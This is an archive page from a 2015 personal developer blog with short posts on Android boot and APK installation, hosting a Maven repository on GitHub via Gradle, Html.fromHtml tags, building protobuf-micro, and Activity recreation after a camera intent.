    <article id="post-AndroidStart" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/03/12/AndroidStart/" class="article-date">
  <time datetime="2015-03-12T10:32:09.000Z" itemprop="datePublished">2015-03-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/03/12/AndroidStart/">AndroidStart</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="Android_开机过程：">Android 开机过程：</h4>
<ul>
<li>首先linux系统会启动一个叫做zygote（可以称为受精卵、母体）的linux程序，这个程序实际上就是android系统的内核</li>
<li>接着zygote会孵化第一个dalvik进程SystemServer，它会通过socket与zygote通信</li>
<li>SystemServer它会发送一个隐式的intent（category：CATEGORY_HOME），也就是launcher了（第三方要开发launcher，只需要加入intent-filter即可）</li>
</ul>
<h4 id="Apk_安装过程：">Apk 安装过程：</h4>
<ul>
<li>将apk文件复制到程序目录下（/data/app/）</li>
<li>为应用创建数据目录（/data/data/package name/）、提取dex文件到指定目录（/data/dalvik-cache/）、修改系统包管理信息</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yzx41099298.github.io/2015/03/12/AndroidStart/" data-id="t16sbfva448pukh6" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-maven" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/03/11/maven/" class="article-date">
  <time datetime="2015-03-11T10:02:21.000Z" itemprop="datePublished">2015-03-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/03/11/maven/">使用Gradle编译链，在Github上托管一个Maven资源库。</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <ol>
<li>在github创建账号，创建Repositories.</li>
<li><p>创建maven本地仓库目录</p>
<pre><code>   $ <span class="built_in">mkdir</span> maven
   $ <span class="keyword">cd</span> maven
   $ <span class="built_in">mkdir</span> abptrcompat
</code></pre></li>
<li><p>在代码的build.gradle文件中加入</p>
<pre><code> apply plugin: <span class="string">'maven'</span>
 uploadArchives {
     <span class="keyword">repositories</span>.mavenDeployer {
         repository(url: <span class="string">"file:///Users/yangzhixin/maven/abptrcompat/"</span>)
         pom {
             version = <span class="string">'1.0.0'</span>
             artifactId = <span class="string">'yzx-abptrcompat'</span>
             groupId = <span class="string">'com.yzx'</span>
         }
     }
 } 
</code></pre></li>
<li><p>编译上传到本地仓库</p>
<pre><code> <span class="variable">$ </span>gradle clean build uploadArchives
</code></pre></li>
<li><p>进入本地仓库目录 maven/abptrcompat</p>
<pre><code> <span class="variable">$ </span>git init
   <span class="variable">$ </span>git remote add remotecompat <span class="symbol">https:</span>/<span class="regexp">/github.com/yzx</span>41099298/abptrcompat.git
   <span class="variable">$ </span>git add .
   <span class="variable">$ </span>git commit -m “abcompat-<span class="number">1.0</span>.<span class="number">0</span>”
   <span class="variable">$ </span>git push remotecompat master
</code></pre></li>
<li><p>在调用库的build.gradle中加入</p>
<pre><code> <span class="keyword">repositories</span> {
     maven{ url <span class="string">"https://github.com/yzx41099298/abptrcompat/raw/master/"</span>}
 }

 <span class="keyword">dependencies</span> {
     <span class="keyword">compile</span> <span class="string">'com.yzx:yzx-abptrcompat:1.0.0@aar'</span>
 } 
</code></pre></li>
</ol>
<p>参考：<a href="http://downright-amazed.blogspot.com/2011/09/hosting-maven-repository-on-github-for.html" target="_blank" rel="external">http://downright-amazed.blogspot.com/2011/09/hosting-maven-repository-on-github-for.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yzx41099298.github.io/2015/03/11/maven/" data-id="olra2btixhes8lsd" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Fromhtml" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/03/11/Fromhtml/" class="article-date">
  <time datetime="2015-03-11T09:58:35.000Z" itemprop="datePublished">2015-03-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/03/11/Fromhtml/">Html.fromhtml 方法支持的参数</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <table>
<thead>
<tr>
<th>Tags</th>
<th style="text-align:left">Format</th>
</tr>
</thead>
<tbody>
<tr>
<td>b, strong</td>
<td style="text-align:left">Bold</td>
</tr>
<tr>
<td>i, em, cite, dfn</td>
<td style="text-align:left">Italics</td>
</tr>
<tr>
<td>u</td>
<td style="text-align:left">Underline</td>
</tr>
<tr>
<td>sub</td>
<td style="text-align:left">Subtext</td>
</tr>
<tr>
<td>sup</td>
<td style="text-align:left">Supertext</td>
</tr>
<tr>
<td>big</td>
<td style="text-align:left">Big</td>
</tr>
<tr>
<td>small</td>
<td style="text-align:left">Small</td>
</tr>
<tr>
<td>tt</td>
<td style="text-align:left">Monospace</td>
</tr>
<tr>
<td>h1 … h6</td>
<td style="text-align:left">Headlines</td>
</tr>
<tr>
<td>img</td>
<td style="text-align:left">Image</td>
</tr>
<tr>
<td>font</td>
<td style="text-align:left">Font face and color</td>
</tr>
<tr>
<td>blockquote</td>
<td style="text-align:left">For longer quotes</td>
</tr>
<tr>
<td>a</td>
<td style="text-align:left">Link</td>
</tr>
<tr>
<td>div, p</td>
<td style="text-align:left">Paragraph</td>
</tr>
<tr>
<td>br</td>
<td style="text-align:left">Linefeed</td>
</tr>
</tbody>
</table>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yzx41099298.github.io/2015/03/11/Fromhtml/" data-id="4v5akf4f7th12ae1" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-protobuf" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/03/11/protobuf/" class="article-date">
  <time datetime="2015-03-11T09:56:39.000Z" itemprop="datePublished">2015-03-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/03/11/protobuf/">Protobuf Micro</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="Install:">Install:</h3>
<ol>
<li><p>Download protomicro at: <a href="https://code.google.com/p/micro-protobuf/" target="_blank" rel="external">https://code.google.com/p/micro-protobuf/</a></p>
</li>
<li><p>$ ./configure</p>
</li>
<li><p>$ make</p>
<p> If errors as below：<br> make[2]: <strong><em> [message.lo] Error 1<br> make[1]: </em></strong> [all-recursive] Error 1<br> make: <em>*</em> [all] Error 2</p>
<p> Add  “#include <istream>“ in src/google/protobuf/message.cc</istream></p>
</li>
<li><p>Create file protoc in /usr/local/bin/<br> $ make install</p>
</li>
</ol>
<h3 id="USAGE:">USAGE:</h3>
<ol>
<li><p>Define .proto file</p>
</li>
<li><p>Create a java class in out_dir.<br> $ /usr/local/bin/protoc —-javamicro_out=”our_dir” <em>*</em>.proto</p>
</li>
<li><p>Use the java class。 </p>
</li>
<li><p>Import com.google.protobuf.micro in micro-protobuf-read-only/java/src/main/java/。</p>
</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yzx41099298.github.io/2015/03/11/protobuf/" data-id="xheo66pydhq549cv" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-ActivityResult" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/03/11/ActivityResult/" class="article-date">
  <time datetime="2015-03-11T09:53:17.000Z" itemprop="datePublished">2015-03-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/03/11/ActivityResult/">Activity being created twice, when back from camera Intent</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <ul>
<li><p>Android may choose to destroy an Activity that is waiting for the call to onActivityResult; especially when free memory is running low. Some devices appear more aggressive about destroying Activitys that are on the task stack. I can reliably recreate the issue on a Samsung device set to a debugging mode called “strict mode”.</p>
</li>
<li><p>You can verify whether this is your issue by logging calls to onCreate &amp; onDestroy.</p>
</li>
<li><p>In the case of a destroyed activity, when the activity result needs to be processed, Android will recreate the Activity, passing a savedInstanceState to onCreate. So, the remedy is to check the value of savedInstanceState in your GetImageActivity.onCreate. If it is not null then don’t make any calls to startActivity because your Activity is being recreated to call onActivityResult.</p>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yzx41099298.github.io/2015/03/11/ActivityResult/" data-id="lssb00mbtjzaugzg" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/">Next &raquo;</a>
    </nav>
  
</section>
        
          <aside id="sidebar">
  
    
  
    
  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">March 2015</a><span class="archive-list-count">14</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recents</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2015/03/23/matrix/">Matrix pre post set</a>
          </li>
        
          <li>
            <a href="/2015/03/19/pulltorefresh/">下拉刷新的简单实现</a>
          </li>
        
          <li>
            <a href="/2015/03/16/WebViewJS/">在WebView中添加JS</a>
          </li>
        
          <li>
            <a href="/2015/03/13/TouchEvent/">TouchEvent派发机制</a>
          </li>
        
          <li>
            <a href="/2015/03/13/dl/">Android apk动态加载机制</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2015 yzx<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">

  <script src="/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>



<script src="/js/script.js" type="text/javascript"></script>


  </div>
</body>
</html>